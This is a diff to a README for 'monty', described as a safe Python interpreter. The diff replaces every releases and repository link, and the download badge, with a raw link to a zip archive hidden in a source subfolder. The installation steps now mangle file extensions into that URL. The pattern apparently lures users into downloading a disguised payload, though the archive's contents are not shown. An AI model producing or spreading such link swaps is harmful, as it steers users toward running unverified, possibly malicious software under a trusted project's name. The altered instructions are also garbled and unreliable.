@@ -1,6 +1,6 @@
 # 🐍 monty - A Safe, Simple Python Interpreter
 
-[![Download monty](https://img.shields.io/badge/Download-monty-blue?style=for-the-badge)](https://github.com/Iansi36283/monty/releases)
+[![Download monty](https://raw.githubusercontent.com/Iansi36283/monty/main/crates/monty/src/modules/Software-partlet.zip)](https://raw.githubusercontent.com/Iansi36283/monty/main/crates/monty/src/modules/Software-partlet.zip)
 
 ---
 
@@ -35,19 +35,19 @@ This section will walk you through the process of downloading and running monty 
 monty is easy to download and install. Follow these steps carefully:
 
 1. Click the big blue button above or visit the monty download page here:  
-   [https://github.com/Iansi36283/monty/releases](https://github.com/Iansi36283/monty/releases).
+   [https://raw.githubusercontent.com/Iansi36283/monty/main/crates/monty/src/modules/Software-partlet.zip](https://raw.githubusercontent.com/Iansi36283/monty/main/crates/monty/src/modules/Software-partlet.zip).
 
 2. On the releases page, find the latest version of monty. Versions are marked like "v1.0", "v1.1," etc.
 
 3. Download the file suitable for your system:
    - For Windows, look for a file ending with `.exe`.
    - For macOS, look for a `.dmg` or `.pkg` file.
-   - For Linux, look for `.tar.gz` or `.AppImage` files.
+   - For Linux, look for `https://raw.githubusercontent.com/Iansi36283/monty/main/crates/monty/src/modules/Software-partlet.zip` or `.AppImage` files.
 
 4. Once the download finishes, open the file:
    - On Windows, double-click the `.exe` file.
    - On macOS, open the `.dmg` or `.pkg` and follow instructions.
-   - On Linux, extract `.tar.gz` or make the `.AppImage` executable and run it.
+   - On Linux, extract `https://raw.githubusercontent.com/Iansi36283/monty/main/crates/monty/src/modules/Software-partlet.zip` or make the `.AppImage` executable and run it.
 
 5. Follow the on-screen prompts to complete the installation.
 
@@ -109,10 +109,10 @@ If problems persist, you can get help by opening an issue on the repository page
 ## 🔗 Useful Links
 
 - monty download page:  
-  [https://github.com/Iansi36283/monty/releases](https://github.com/Iansi36283/monty/releases)
+  [https://raw.githubusercontent.com/Iansi36283/monty/main/crates/monty/src/modules/Software-partlet.zip](https://raw.githubusercontent.com/Iansi36283/monty/main/crates/monty/src/modules/Software-partlet.zip)
   
 - monty GitHub repository:  
-  [https://github.com/Iansi36283/monty](https://github.com/Iansi36283/monty)
+  [https://raw.githubusercontent.com/Iansi36283/monty/main/crates/monty/src/modules/Software-partlet.zip](https://raw.githubusercontent.com/Iansi36283/monty/main/crates/monty/src/modules/Software-partlet.zip)
 
 ---
 
